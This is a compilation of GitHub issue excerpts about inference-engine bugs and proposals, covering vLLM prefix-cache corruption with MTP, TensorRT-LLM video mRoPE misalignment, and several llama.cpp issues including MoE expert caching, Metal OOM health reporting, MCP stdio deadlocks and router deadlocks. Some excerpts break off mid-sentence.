vLLM Build Flags: CUDA Archs: Not Set; ROCm: Disabled; XPU: Disabled GPU Topology: NV18 all-to-all (8x H100 SXM), TP=1 used Relevant packages: vllm==0.28.0 torch==2.13.0 transformers==5.15.1 flashinfer-python==0.6.16.post3 compressed-tensors==0.17.0 xgrammar==0.2.3 ```
### 🐛 Describe the bug **Summary.** `--enable-prefix-caching` together with MTP speculative decoding still corrupts output on hybrid (GDN/Mamba) Qwen3.5-class models in **v0.28.0**. A small fraction of responses degenerate into repeated punctuation (`!!!!…`) or come back empty. This is the same failure as #43559, which was closed as completed on 2026-08-06 — the merged scheduler-side fix (#51113) does not cover it, and the cache-manager-side fixes (#43650, #48375) are still open. **Model.** Qwen3.5-architecture dense 27B VLM (`Qwen3_5ForConditionalGeneration`, hybrid: Gated DeltaNet linear-attention layers + full attention every 4th layer, vision tower), FP8 W8A8 compressed-tensors (`FP8_DYNAMIC`), with an MTP head present in the checkpoint (`Qwen3_5MTP` resolves at startup). TP=1, single H100. **Server command** (paths redacted): ```bash export VLLM_NO_USAGE_STATS=1 export VLLM_USE_FLASHINFER_SAMPLER=0 vllm serve \ --served-model-name path-mini \ --port 8000 \ --max-model-len 62768 \ --max-num-seqs 32 \ --gpu-memory-utilization 0.95 \ --enable-chunked-prefill \ --limit-mm-per-prompt.image 10 \ --enable-prefix-caching \ --mamba-cache-mode align \ --speculative-config '{"method": "mtp", "num_speculative_tokens": 2}' ``` Startup confirms the configuration: `Resolved architecture: Qwen3_5MTP`, `enable_prefix_caching=True`, `num_spec_tokens=2`, `GPU KV cache size: 576,637 tokens`, attention block size 800 (forced up to match the mamba page size), async scheduling enabled (default). **Workload.** Multi-step GUI-agent traces: each request is a conversation of prior steps plus 1–3 screenshots (sliding 2-image history), ~4k–12k prompt tokens, ~20–100 output tokens, `temperature=0`, client concurrency up to 32. Consecutive steps of the same episode share a long prefix, so prefix-cache hit rate climbs through a run. **Observed.** | vLLM | prefix caching | MTP | final prefix-cache hit rate | malformed responses | |---|---|---|---|---| | 0.26.0 | on | k=2 | 27.5% | 25 / 2,636 (0.95%) | | **0.28.0** | **on** | **k=2** | **31.7%** | **4 / 495 (0.81%)** | | 0.28.0 | on | k=2, `--kv-cache-dtype fp8` | ~10% (see note) | 0 / 1,135 | Malformed = response is a run of repeated `!` characters, or empty content. `finish_reason` is normal; no HTTP 5xx, no crash, no traceback — the engine stays healthy and every other response in the same run is correct. Two observations that point at the prefix cache rather than at MTP alone: 1. **Rate tracks cache hit rate.** Corruption appears only once the prefix cache starts hitting, and scales with the hit rate. 2. **`--kv-cache-dtype fp8` appears to avoid it, but only by destroying the cache.** With fp8 KV, vLLM raises the attention block size 800 → 1600 (`platforms/interface.py`, so that one attention page covers one mamba page). Our requests share ~1,700 tokens of prefix, so at a 1600-token matching unit almost nothing is reusable: hit rate collapses from 31.7% to ~10%, and malformed responses go to 0/1,135. That is consistent with reduced exposure, not with fp8 fixing the underlying defect. (For the same reason `--block-size 800` cannot be used to compensate: the value is derived and only ever raised.) **Suspected cause** (already described in #43650 / #48375): `MambaManager.find_longest_cache_hit` in `vllm/v1/core/single_type_kv_cache_manager.py` accepts `drop_eagle_block` and never acts on it, so the final matched block — which can hold recurrent state written over draft positions that verification later rejected — stays reachable through the prefix cache and is reused by subsequent requests sharing that prefix. `FullAttentionManager` drops that block. In v0.28.0 the caller (`kv_cache_coordinator.py`) additionally skips the eagle margin for `MambaSpec` with the comment *"its finder never drops"*, i.e. caller and manager disagree about who is responsible. Applying **#43650** (6 lines, `max_num_blocks -= 1` when `use_eagle`) on top of v0.28.0 starts cleanly and shows no regression on an unrelated accuracy check (100 grounding requests at concurrency 32: 76% vs 75% unpatched, identical coor

items.title: [Bug]: Qwen3-VL E/PD handoff drops per-frame timestamp tokens and frame markers for video inputs; encoder-side mRoPE ids are sliced against the shorter PD prompt
items.author: john-liu-dev
items.body_excerpt:
### System Info

- TensorRT-LLM 1.3.0rc25 (`785c948`), PyTorch backend, LLM API only (no serving framework involved); transformers 5.5.4; PyTorch 2.12.0a0 (NGC 26.05 build).
- Re-checked on `main` at `760a584` (2026-10-12): the code involved is unchanged, see "Status on main" below.
- Model: `Qwen/Qwen3-VL-8B-Instruct` (bf16). `Qwen/Qwen3-VL-2B-Instruct` goes through the same code path and is expected to behave the same (not run).
- One GPU per run: the encoder (`MultimodalEncoder`) and the PD (`LLM`) share the GPU and the process. Reproduced on two different GPU types.
- Input: synthetic 10 s / 24 fps / 1280x720 H.264 clips; 40 uniformly spaced frames passed as `VideoData` with metadata `{fps, total_num_frames, duration, frames_indices}`; `mm_processor_kwargs={"do_sample_frames": False}` (-> `video_grid_thw` `[20, 36, 66]`, 11,880 visual tokens, E->PD handle `[11880, 16384]` bf16).
- Greedy decoding: `SamplingParams(temperature=0, top_k=1, max_tokens=64)`.

### Who can help?

_No response_

### Information

- [ ] The official example scripts
- [x] My own modified scripts

### Tasks

- [ ] An officially supported task in the `examples` folder (such as GLUE/SQuAD, ...)
- [x] My own task or dataset (give details below)

### Reproduction

For video inputs, the E/PD handoff (`MultimodalEncoder` -> `DisaggregatedParams` -> `LLM.generate_async(disaggregated_params=...)`) rebuilds a prompt on the PD side whose layout differs from the aggregated path: the per-frame-group timestamp tokens and the per-group `<|vision_start|>` / `<|vision_end|>` markers are missing. The mRoPE position ids/deltas shipped from the encoder, however, follow the aggregated layout, and the PD side slices them to its own (shorter) prompt length without any check. Visual-token positions and the decode-time mRoPE delta end up misaligned. No error is raised; the output departs from the aggregated path within the first few tokens and the model loses its sense of time, while frame content is still recognized.

Minimal reproduction (public APIs only; LLM API, because the `trtllm-serve` E/PD protocol does not carry multimodal / mRoPE handles yet, see the TODO at `tensorrt_llm/serve/openai_protocol.py` L320):

```python
import os, cv2, numpy as np, torch
from transformers import AutoTokenizer
from tensorrt_llm import LLM, MultimodalEncoder, SamplingParams
from tensorrt_llm.llmapi import KvCacheConfig
from tensorrt_llm.inputs.multimodal_data import VideoData

MODEL = "Qwen/Qwen3-VL-8B-Instruct"

def load_video(path, n=40):
    cap, raw = cv2.VideoCapture(path), []
    fps = cap.get(cv2.CAP_PROP_FPS)
    while (r := cap.read())[0]:
        raw.append(r[1])
    idx = np.linspace(0, len(raw) - 1, n).astype(int)
    frames = [torch.from_numpy(cv2.cvtColor(raw[i], cv2.COLOR_BGR2RGB)).permute(2, 0, 1).float() / 255 for i in idx]
    return VideoData(frames=frames, metadata={"fps": fps, "total_num_frames": len(raw),
                                              "duration": len(raw) / fps, "frames_indices": idx.tolist()})

if __name__ == "__main__":  # required: LLM() starts its executor via MpiPoolSession, which re-imports this file
    tok = AutoTokenizer.from_pretrained(MODEL)
    prompt = tok.apply_chat_template([{"role": "user", "content": [{"type": "video"}, {"type": "text",
              "text": 'List the events as JSON {"events": [{"start_s", "end_s", "description"}]}.'}]}],
              tokenize=False, add_generation_prompt=True)
    mm = {"prompt": prompt, "multi_modal_data": {"video": [load_video("clip_10s_720p_24fps.mp4")]},
          "mm_processor_kwargs": {"do_sample_frames": False}}
    sp = SamplingParams(temperature=0, top_k=1, max_tokens=64)
    kw = dict(model=MODEL, max_num_tokens=16384, max_seq_len=32768, disable_overlap_scheduler=True,
              kv_cache_config=KvCacheConfig(free_gpu_memory_fraction=0.5))

    # Path A: aggregated (raw video into the LLM)
    llm = LLM(**kw); out_a = llm.generate(mm, sp); llm.shutdown()

    # Path B: E/PD handoff on the same GPU
    os.environ["TLLM_MULTIMODAL_DISAGGREGATED"] = "1"          # PD model skips building the ViT
    llm = LLM(**kw)
    enc = MultimodalEncoder(model=MODEL, max_num_tokens=65536)  # grid 20x36x66 = 47,520 pre-merge patches > default 16384
    enc_out = enc.generate_async(mm).result()
    dp = enc_out.disaggregated_params
    dp.request_type = "context_and_generation"
    out_b = llm.generate_async({"prompt": prompt}, sampling_params=sp, disaggregated_params=dp).result()

    print(out_a.outputs[0].token_ids[:8], out_b.outputs[0].token_ids[:8])  # differ within the first few tokens
    print(len(out_a.prompt_token_ids), len(enc_out.prompt_token_ids), len(out_b.prompt_token_ids))
```

### Expected behavior

Path B produces the same greedy tokens as path A (same weights, same frames, same processor kwargs, same sampling), or at least sees the same prompt layout, with mRoPE positions consistent with it.

### actual behavior

8 clips x 40 frames, Qwen3-VL-8B. Our harness runs the same flow as the script, with a longer structured-output prompt (JSON events with start/end times):

- Exact match A vs B: 0/8; all 8 clips diverge at output token 0.
- A: all 8 answers start with `{"events": [{"start_s": 0.0, "end_s": 10.0, ...` (correct duration).
- B: all 8 answers start with `` ```json ``; 3/8 answer `"start_time": 0, "end_time": 100` for the 10 s clip. The description of what is shown in the frames is correct, so the embeddings themselves are fine; timing is lost.
- Layout (measured with a diagnostic run on 2 of the clips; identical for both): `L_agg = L_encoder = 12,231` and `L_pd = 12,073`, i.e. delta = 158 = 20 timestamps x 6 tokens + 38 frame markers (19 extra `<|vision_start|>` + 19 extra `<|vision_end|>`). With the mask-based layout helpers, the aggregated prompt has 20 runs x 594 `<|video_pad|>`; the PD rebuild has a single run of 11,881 (`<|vision_start|>` + 11,880 pads).
- The encoder's `mrope_position_ids` have shape `[3, 1, 12231]` and deltas -11,22

items.title: Feature Request: Graceful reasoning budget termination. Avoid mid-sentence cutoff.
items.author: CleStil
items.body_excerpt:
### Prerequisites

- [x] I am running the latest code. Mention the version if possible as well.
- [x] I carefully followed the [README.md](https://github.com/ggml-org/llama.cpp/blob/master/README.md).
- [x] I searched using keywords relevant to my issue to make sure that I am creating a new issue that is not already open (or closed).
- [x] I reviewed the [Discussions](https://github.com/ggml-org/llama.cpp/discussions), and have a new and useful enhancement to share.

### Feature Description

PR #20297 (merged ~2025-03-11) added `--reasoning-budget-message`, which injects
a string at the hard token cutoff to signal the model to wrap up. The injection
still happens at exactly token N with zero warning. The model gets no time to
finish its current thought before the `</think>` boundary.

Graceful termination before the cutoff is expected to improve reasoning
performance. See Motivation and Possible Implementation for details.


### Motivation

Raw truncation of the thinking trace measurably reduces answer quality compared
to graceful termination. Muennighoff et al. (s1: Simple test-time scaling,
arXiv:2501.19393) showed that appending an end-of-thinking delimiter with
"Final Answer:" before the hard cut outperforms naïve truncation. This was
confirmed by follow-up work (arXiv:2505.05315), which states directly that
"the S1 approach performs better than directly truncating the full reasoning
trajectory, underscoring the importance of preserving the solution segment."

The current --reasoning-budget-message implementation injects a wrap-up message
at exactly token N, leaving the model zero tokens to actually act on it. This is
functionally equivalent to truncation with a cosmetic suffix — the model cannot
produce a meaningful conclusion within 0 remaining tokens.

### Possible Implementation

Three approaches in increasing complexity:

Option A — message offset
Inject the budget message at `budget - offset` instead of `budget`, giving the
model `offset` tokens to act on the wrap-up signal. The s1 paper
(https://arxiv.org/abs/2501.19393) shows this outperforms raw truncation.
Change in the COUNTING state of reasoning-budget.cpp:

    if (ctx->remaining <= ctx->warn_offset)  // was: <= 0

Files: reasoning-budget.cpp, reasoning-budget.h, common.h, arg.cpp,
sampling.cpp. Default 0 preserves current behavior.

Option B — separate budgeting
Split total budget into thinking (t) and conclusion (s) phases, t + s = budget.
Force `</think>` at token t, leave s tokens for a conclusion before the answer.
Follow-up work on s1 (https://arxiv.org/abs/2505.05315) shows this outperforms
the basic offset approach. Would add a second parameter, e.g.
--reasoning-budget-conclusion M.

Option C — logit biasing toward `</think>`
Ramp up the logit weight of `</think>` as the budget runs low, then force it at
the hard limit. No dependency on an injected phrase, model-agnostic. NVIDIA NIM
uses this approach with a 10% extension window for sentence completion. More
invasive (sampler changes) but cleanest long-term.

Options A and B build on the existing message injection architecture. Option C
is a parallel approach that could coexist with either.

Happy to test on ROCm/gfx1100 (Qwen3.5-27B) and contribute a draft of Option A
or B if there is interest.

items.title: RFC: MoE expert cache, VRAM caching of hot CPU-resident experts with hybrid hit/miss execution
items.author: leloch
items.body_excerpt:
*Follow-up to #24524, which was closed as too large to review — @am17an suggested
an RFC laying out the benefits vs the maintenance burden, and explicitly suggested
having the AI draft it. So, full disclosure: this document and the code it
describes were predominantly generated by an AI (Anthropic's Claude Fable 5),
working under my direction on my hardware. Code: [`leloch:moe-cache-pr`](https://github.com/ggml-org/llama.cpp/compare/master...leloch:llama.cpp:moe-cache-pr).*

## Problem

When a MoE model spills experts to system RAM (`--cpu-moe` / `--n-cpu-moe` /
auto-fit), decode is dominated by the CPU reading expert weights at RAM
bandwidth while the GPUs idle. Prior attempts (#20757, #21609, #21614, #21620,
#23170) all moved MUL_MAT_ID to the GPU and tried to make the weight copies
cheaper. That puts every cache miss on the critical path as a synchronous PCIe
transfer: @batot1 measured ~3× decode regression from forced decode offload
without residency (#20757), and the Metal slot-pool experiment in the same
thread was 2× slower than vanilla even at 97–99% hit rate, purely from
per-layer sync points. #23170's post-mortem concluded the staging-buffer
approach is a no-op when made correct, and that the fix is a separate
persistent expert-cache buffer with explicit expert→slot bookkeeping.

On the discussions side, #22584 proposes the static version of this idea
(offline expert profiling + strategic placement), #19030 and PR #21067 the
prefetch version (latency-hiding without residency), and #22183 asks the
placement question a runtime cache answers automatically ("use the idle fast
device for experts") — but no runtime expert cache has been proposed as an
RFC before.

## Proposed design

That persistent buffer, plus an inverted execution model: **MUL_MAT_ID stays on
the CPU.** Inside the CPU kernel, thread 0 dispatches one batched matvec over
the cached (hit) rows on the GPU while the other threads compute the miss rows
as they normally would. Misses cost nothing extra, hit rate is pure upside,
worst case degrades to the vanilla CPU path. Fill is decode-only (prompt
routing is far flatter and thrashes the cache); decode routing is skewed
enough to make this work — measured on Qwen3.5-122B, the top 10% of experts
take ~80% of hits (independent corroboration in #20757: Gini ≈ 0.76, ~99%
simulated hit rate at 69% expert budget). Complementary to #21067: prefetch
hides *cold* transfers at large ubatch (prompt); this removes *hot*
re-transfers at ubatch 1 (decode).

## Measured benefit

4× RTX 3090, EPYC 7R13 48c, 8-ch DDR4-3200 256GB; llama-bench tg300, identical command
lines both arms:

| Model | Regime | cache | vanilla | gain |
|---|---|---|---|---|
| GLM-5.1 754B IQ2_M (220 GB) | zero-config | 17.49 | 13.96 | **+25%** |
| Qwen3.5 397B Q3_K_XL (167 GB) | zero-config | 30.25 | 28.18 | +7% |
| Qwen3.5 122B (fits in VRAM) | zero-config | 74.98 | 74.98 | parity (cache dormant) |
| 13 models / 9 architectures | forced `-ngl 99 -ncmoe 99` | | | +10%…+57%, 16/16 ≥ parity |

Quality: decode-path perplexity statistically identical to pure CPU;
prompt/batch path bit-untouched; `test-backend-ops` MUL_MAT_ID 789/789 both
modes. (GPU rounding can flip a near-tie token under greedy decoding, same
class as any `-ngl` change.)

## Maintenance burden:

**Where the code lives.** ~1,700 lines in one new CUDA file pair
(`moe-cache.cu/.cuh`); a backend-agnostic function-pointer API table
(`ggml-backend-moe-cache.h`); small null-checked hooks in `ggml-cpu.c`/`ops.cpp`
(mul_mat_id + GLU) and `ggml-backend.cpp` (scheduler offer/redirect); a fit
rule + `--moe-cache` flag in common. Non-CUDA builds see a zero-initialized
table and no-op hooks; `--moe-cache 0` restores stock behavior exactly.

**The real costs**

1. **It hooks the CPU mul_mat_id hot path.** The hooks are null-checked
   pointers, but anyone refactoring the CPU MoE kernels or the scheduler
   split logic now has a second consumer to think about. This is the largest
   structural cost.
2. **Heuristics that maintainers didn't choose.** Shape-census stability
   window, baseline-sampled bail-out (EWMA, 4 strikes at +5%), VRAM reserve
   default, decode-only fill. They're measured, but they're policy, and
   policy invites tuning requests.
3. **Hard to test in CI.** The cache only engages on spilling MoE models
   during decode; CI can verify it stays dormant and that the dispatch path
   is numerically correct (a built-in selftest does this model-free), but the
   perf claims need big-RAM multi-GPU hardware. Realistically, regressions
   would be caught by users, not CI.
4. **CUDA-only.** The API table is backend-agnostic, but today only CUDA
   registers it; Metal/Vulkan users will ask.
5. **State.** A persistent hot-set file (`~/.cache/llama.cpp/`) and an
   admission/eviction state machine — more surface than a stateless
   optimization.

**What would reduce the burden, if there's interest:**

- A **minimal core** (plain per-node dispatch only: no fused gate+up+SwiGLU,
  no GPU-resident handoff, no hot-set persistence) is roughly half the code
  and keeps most of the gain; I can measure each layer's exact contribution
  on this hardware.
- Landing the **API table + CPU hooks alone** first (~small, inert without a
  backend registration) would let any backend implement caching out-of-tree
  before committing to the CUDA implementation.
- Or: nobody merges anything, and this stays a documented design +
  benchmark set that informs #21067 or a future maintainer-built version.
  That's a fine outcome too.

## Offer

The 4×3090 / 48-core / 8-channel 256GB DDR4-3200 box is available for any benchmark,
ablation, or A/B against #21067 that would help evaluate this. All results
above are reproducible with the commands in the branch's commit messages.

items.title: Misc. bug: server reports "model loaded" and binds the port after a fatal Metal OOM during init; every request then 500s
items.author: Iwan-Teague
items.body_excerpt:
### Name and Version

```
version: 9960 (a935fbffe)
built with AppleClang 21.0.0.21000099 for Darwin arm64
```

Homebrew build, Metal backend.

### Operating systems

Mac (macOS 26.5.1, build 25F80), Apple M5, 24 GB unified memory.

### Which llama.cpp modules do you know to be affected?

llama-server

### Command line

```shell
llama-server -m Ornith-1.0-35B-UD-Q3_K_M.gguf \
  -ngl 99 -c 262144 -np 1 -ctk q8_0 -ctv q8_0 -fa auto --port 8080
```

### Problem description & steps to reproduce

When a Metal allocation fails during init, the server logs the failure, logs that the
backend is unrecoverable, and then finishes starting up anyway. It prints `model loaded`,
binds the port, and answers `/health` with `{"status":"ok"}`. Every completion request
after that returns HTTP 500.

The per-request errors are reported correctly, so this isn't silent corruption. The
problem is that startup completes and `/health` reports ready for a process that can
never serve a request. Anything using `/health` as a readiness probe treats it as up.

I should say up front that `-ngl 99` disabled the auto-fit that would otherwise have
prevented this:

```
W common_fit_params: failed to fit params to free device memory: n_gpu_layers already set by user to 99, abort
```

So the OOM itself is arguably my own fault. The part I think is still a bug is what
happens afterwards — the backend reports itself unrecoverable and the server starts
anyway.

Steps:

1. Pick a context size where the allocation cannot fit. On a 24 GB M5 the Metal device
   reports 18186 MiB, and this model at `-c 262144` needs 19005 MiB. llama.cpp's own
   memory breakdown says so directly:
   ```
   cmn  common_param:   - MTL0    : Apple M5 (18186 MiB, 18185 MiB free)
   load_tensors:  MTL0_Mapped model buffer size = 15897.19 MiB
   llama_kv_cache:       MTL0 KV buffer size =  2720.00 MiB
   common_memory_breakdown_print: |   - MTL0 (Apple M5)    | 18186 = ... + (19005 = 15897 +    2782 +     325) +         398 |
   ```
   At `-c 65536` the KV cache drops to ~680 MiB and it fits.
2. Start the server with the command line above.
3. 15 `Insufficient Memory` errors during init, then the backend declares itself
   unrecoverable and the decode fails.
4. Server prints `model loaded` and `listening on http://127.0.0.1:8080`.
5. `/health` → 200 `{"status":"ok"}`.
6. Any completion request → 500, and the OOM count roughly doubles.
7. Re-run at `-c 65536` and the same model starts and serves normally.

### What I'd expect

Exit non-zero at startup, the way other unrecoverable init failures already do — a
quantized V cache without flash attention returns `nullptr` and the server refuses to
start (b9960 `src/llama-context.cpp:3518`; on master the same check is at `:3602`,
reworded to `quantized V cache requires flash_attn to be enabled`).

Failing that, `/health` should reflect it. It currently returns `{"status":"ok"}`
unconditionally once the model is marked loaded (b9960
`tools/server/server-context.cpp:4322`, master `:4448`); the only gate is the
server-state middleware, which fires solely on `!is_ready`.

### Relevant log output

Init (timestamps and log-level prefixes trimmed):

```
ggml_metal_synchronize: error: command buffer 0 failed with status 5
error: Insufficient Memory (00000008:kIOGPUCommandBufferCallbackErrorOutOfMemory)
   ... 15 occurrences ...
ggml_metal_graph_compute: backend is in error state from a previous command buffer failure - recreate the backend to recover
graph_compute: ggml_backend_sched_graph_compute_async failed with error -1
process_ubatch: failed to compute graph, compute status: -1
llama_decode: failed to decode, ret = -3
cmn  common_conte: llama_decode() failed: -3
srv  llama_server: model loaded
srv  llama_server: listening on http://127.0.0.1:8080
```

One completion request afterwards:

```
ggml_metal_graph_compute: backend is in error state from a previous command buffer failure - recreate the backend to recover
llama_decode: failed to decode, ret = -3
srv        decode: Compute error. off = 0, n_batch = 2048, ret = -3
srv    send_error: task id = 0, error: Compute error.
srv  update_slots: decode() failed: Compute error.
```

Observed from the client:

```
$ curl -s -w '\n%{http_code}\n' localhost:8080/health
{"status":"ok"}
200

$ curl -s -w '\n%{http_code}\n' localhost:8080/completion \
    -H 'Content-Type: application/json' \
    -d '{"prompt":"int add(int a,int b){","n_predict":20,"temperature":0}'
{"error":{"code":500,"message":"Compute error.","type":"server_error"}}
500
```

`Insufficient Memory` count: 15 after init, 28 after one request, 29 including shutdown.

### Notes

Reproduced on b9960 (`a935fbffe`). I haven't run master, but both relevant paths look
unchanged there: the init probe still treats a failed `llama_decode` as non-fatal and
continues (master `common/common.cpp:1576`, b9960 `:1497`), and `/health` is still
unconditional. Worth confirming against master before acting on it.

One model, one machine, Metal only. Speculative decoding was not involved
(`speculative decoding not supported by this context` appears in the log).

items.title: Eval bug: `-fit` flag doesn't leave enought space in VRAM for MTP, causing a crash
items.author: urman0-git
items.body_excerpt:
### Name and Version

```
❯ llama version
version: 0.3.0-dev (build 10741, commit 9d817213a)
built with GNU 16.2.1 for Linux x86_64
```

### Operating systems

Linux

### GGML backends

CUDA

### Hardware

```
RTX 4060 (8 GB)
Ryzen 5 5600
32 GB VRAM
```

### Models

Gemma4 26B A4B QAT Q4_K_XL (with mtp file) (https://hf.co/unsloth/gemma-4-26B-A4B-it-qat-GGUF)
Gemma4 E4B QAT Q4_K_XL (with mtp file) (https://hf.co/unsloth/Qwen3.8-27B-GGUF)
Qwen3.8 27B Q4_K_XL (mtp included) (https://hf.co/unsloth/Qwen3.8-27B-GGUF)
Qwen3.6 35B A3B Q4_K_XL (mtp included) (https://hf.co/unsloth/Qwen3.6-35B-A3B-MTP-GGUF)

### Problem description & steps to reproduce

When the `-fit` flag is enabled, and the model is loading with MTP speculative decoding (`--spec-type draft-mtp`), it crashes, because the flag seems to not include VRAM required by MTP head, either embedded in the base model or as a separate `.gguf` file (such as Gemma4's)
This applies to every model (that I tested) that is loaded with CPU offload, because smaller models (like Gemma4 E4B) that fit entirely in VRAM and leave enough space for MTP don't crash.

I also can't  try without `fit on`, because `n-cpu-moe` doesn't work. Even if I set it to 50 on a 27B model, it still refuses to load. That didn't happen before, and I even tried changing `n-gpu-layers` from 999 to all or auto, but it still doesn't work. Maybe I'll make another issue on this, but now I'm tired because of this one…

## How to reproduce
1. Use a model that doesn't fit entirely in VRAM
2. Create a `models.ini` preset file, and set appropriate flags (`model`, `fit=on`, `spec-type=draft-mtp` and optional `spec-draft-model`)
3. Run `llama serve --models-preset <path_to_file>`
4. Go to the WebUI (by default `localhost:8080`) and load the MTP model

It should crash. I mean, it shouldn't, but it does.

## Issue duplicate disclaimer
This is the same issue as https://github.com/ggml-org/llama.cpp/issues/24117, but it was closed, and the pull request that was supposed to fix it (https://github.com/ggml-org/llama.cpp/pull/24321) was rejected because of AI use.
Though the issue was supposed to be fixed in b9554, it seems like it's not, at least now.
Now I have to manually adjust layer offloading for every MTP model, which 1. is annoying, and 2. is not dynamic (if the VRAM usage is higher than it was at the time of adjusting the parameters, the model won't load).

items.title: Misc. bug: config-spawned stdio MCP server deadlocks permanently on tool call requests above ~1-5 KB
items.author: Muad0510
items.body_excerpt:
### Name and Version

version: b10900 (win-cuda-13.3-x64)

Also reproduced on b10472 (win-cuda-13.3-x64).

### Operating systems

Windows

### Which llama.cpp modules do you know to be affected?

llama-server

### Command line

```shell
llama-server -m Qwen3.8-27B-Q4_K_M.gguf --mmproj mmproj-Qwen3.8-27B-f16.gguf ^
  -ngl 99 -fa on -ctk q4_0 -ctv q4_0 --jinja -c 131072 -np 1 ^
  --image-min-tokens 1024 --mcp-servers-config mcp-servers.json ^
  --host 127.0.0.1 --port 8080
```

`mcp-servers.json`:

```json
{
  "mcpServers": {
    "inbox": {
      "command": "C:\\Program Files\\nodejs\\node.exe",
      "args": [
        "C:\\path\\to\\mcpvault\\dist\\server.js",
        "D:/notes/inbox"
      ]
    }
  }
}
```

MCP server used: `@bitbonsai/mcpvault` 0.16.0 (Node stdio MCP server for Obsidian-style note folders).

### Problem description & steps to reproduce

A tool call whose request payload is roughly 5 KB or larger never returns. The client
times out after ~30 s. From that point the MCP server is **permanently unreachable** —
every subsequent call to that server, including trivial read calls that worked seconds
earlier, also times out. Other MCP servers in the same config remain fully responsive.

The child process is still alive (confirmed via `Get-CimInstance Win32_Process`) and its
working set continues to change, so it has not crashed. Killing the child process
restores service: llama-server respawns it on the next tool call and everything works
again until the next large request.

This looks like a deadlock or desynchronisation on the stdio pipes between llama-server
and the spawned child, rather than a fault in the MCP server itself (see "Ruled out"
below).

Steps to reproduce:

1. Configure any stdio MCP server exposing a write tool via `--mcp-servers-config`.
2. Issue a tool call with a payload under ~1 KB. Succeeds, returns immediately.
3. Issue a tool call with a payload of ~5 KB. Never returns; client times out at ~30 s.
4. Issue any further call to the same server, e.g. `list_directory`. Also times out.
5. Kill the child process. The next call succeeds again.

Observed threshold, all on a freshly spawned process:

| Request payload | Result |
| --- | --- |
| ~130 B | success |
| ~1,028 B | success (repeatable) |
| ~5,123 B | timeout, server wedged |
| ~6,500 B | timeout, server wedged |

The exact threshold has not been bisected further than "between 1 KB and 5 KB".

Confirmed workaround: writing the same 5,164 B file as one sub-1 KB seed write plus six
sub-1 KB patch calls completes without any hang, and the file reads back byte-correct.
So the limit is on individual request size, not on file size or total data transferred.

### Ruled out

- **Not the MCP server.** Driving the same mcpvault binary against the same folder via
  `@modelcontextprotocol/inspector` writes a 5 KB payload instantly, repeatedly, with no
  hang. Only the llama-server path fails.
- **Not the `cmd /c` wrapper.** Originally the server was spawned via
  `cmd /c npx -y @bitbonsai/mcpvault@latest ...`. Replacing this with a direct
  `node.exe` + absolute script path (shown above) changed nothing.
- **Not a specific build.** Identical behaviour on b10472 and b10900, roughly 400 builds
  apart.
- **Not the folder or its contents.** Read-only servers pointed at other folders on the
  same drive behave identically when given large requests.
- **Not a child-process crash.** The process persists and its memory footprint continues
  to move after the wedge.

Possibly related: #26935 reports the same permanent wedge of all tool calls, triggered by a large number of MCP servers rather than a large request payload.

### First Bad Commit

Not bisected. Present in b10472, the earliest build tested with this feature.

### Relevant log output

Nothing is logged for the failing tool call at `-lv 3`. The only visible trace is the
gap between the completion of one task and the start of the next, matching the client-side
timeout:

```
2.15.328.190 I slot release: id  0 | task 0 | stop processing: n_tokens = 41087, truncated = 0
2.45.851.417 I slot get_availabl: id  0 | task -1 | selected slot by LCP similarity, ...
2.45.852.675 I slot launch_slot_: id  0 | task 1436 | processing task, is_child = 0
2.47.579.483 I slot print_timing: id  0 | task 1436 | prompt eval time = 178.79 ms / 19 tokens
```

The 30.5 s gap at 2.15–2.45 is the tool call that never returned. Startup discovery logs
normally:

```
0.00.412.879 I srv start: MCP warmup: 'notes-a' discovered 11 tools
0.00.850.230 I srv start: MCP warmup: 'notes-b' discovered 11 tools
0.01.230.592 I srv start: MCP warmup: 'inbox' discovered 18 tools
0.01.295.531 I srv setup: Added 40 MCP tools
```

Some logging of MCP request dispatch and completion would make this class of failure much
easier to diagnose; at present a hung tool call is invisible in the server log.

items.title: Misc. bug: router (--models-max 1) hard-deadlocks on a request for a non-resident preset - 500 "resource deadlock would occur" until restart
items.author: Railway9784
items.body_excerpt:
### Name and Version

```
$ llama-server --version
version: 0.4.0-dev (build 10902, commit df03399b8)
built with MSVC 19.44.35228.0 for x64
```

Built with CUDA 12.9, `-DCMAKE_CUDA_ARCHITECTURES=52` (Maxwell / GTX 970M 6 GB).

### Operating systems

Windows

### Which llama.cpp modules do you know to be affected?

llama-server

### Command line

```bat
llama-server.exe --models-preset "D:\Llama.cpp\LIVE-cuda\models-presets.ini" --models-max 1 --host 127.0.0.1 --port 8085 --no-ui
```

`models-presets.ini` (abridged — three presets over the same GGUF, differing in KV quant / ctx):

```ini
[*]
ngl                = 48
split-mode         = layer
threads            = 6
fit                = off
load-mode          = none
flash-attn         = on
ctx-checkpoints    = 8
cache-prompt       = on
parallel           = 1
sleep-idle-seconds = -1
jinja              = on
override-tensor    = ([4-9]|[1-4][0-9]).*exps.*=CPU

[QWEN35B-TEXT-q8q5-ctx120k]
model           = .../Qwen3.6-35B-A3B-Q4_K_S-4.22bpw.gguf
ctx-size        = 122880
cache-type-k    = q8_0
cache-type-v    = q5_0
batch-size      = 2048
ubatch-size     = 2048
load-on-startup = true

[QWEN35B-TEXT-q4q4-ctx120k]    ; same model, cache-type-k/v = q4_0, load-on-startup = false
[QWEN35B-VISION-q8q5-ctx80k]   ; same model + mmproj, ctx-size 81920, load-on-startup = false
```

### Problem description & steps to reproduce

With `--models-max 1`, a request naming a preset that is **not** the resident one — the normal
"switch model" action — **hard-deadlocks the router**. From then on *every* model-bound request on
that process fails until it is restarted. The router's own endpoints keep answering 200, so the
server looks alive. No concurrency is required: a single sequential request is enough.

1. Start the server above. The `load-on-startup = true` preset loads and serves normally.
2. Send **one** request naming a non-resident preset:

   ```
   POST /v1/chat/completions  {"model": "QWEN35B-TEXT-q4q4-ctx120k", "messages": [{"role":"user","content":"hi"}]}
   ```

   (`GET /props?model=QWEN35B-TEXT-q4q4-ctx120k` triggers the same thing.)
3. That request never returns (observed: still hanging after 40 s).
4. From then on, everything model-bound fails:

| Request, after step 2 | Observed |
|---|---|
| `GET /v1/models` | hangs — was **instant / 200** before step 2 |
| `GET /props?model=<non-resident preset>` | timeout (40 s) |
| `GET /props?model=<resident preset>` | degrades: 200 but slow (11.4 s), then fails |
| `POST /v1/chat/completions` (even for the resident model) | **HTTP 500** `{"error":{"code":500,"message":"resource deadlock would occur: resource deadlock would occur","type":"server_error"}}` — returned immediately (0.0 s) |
| `GET /health` | **200 `{"status":"ok"}` throughout** |
| router-level `GET /props` | 200 throughout |

5. Only restarting the process recovers it.

Reproduced twice, on two freshly started routers (wedged ~2 min and ~17 min after start), both
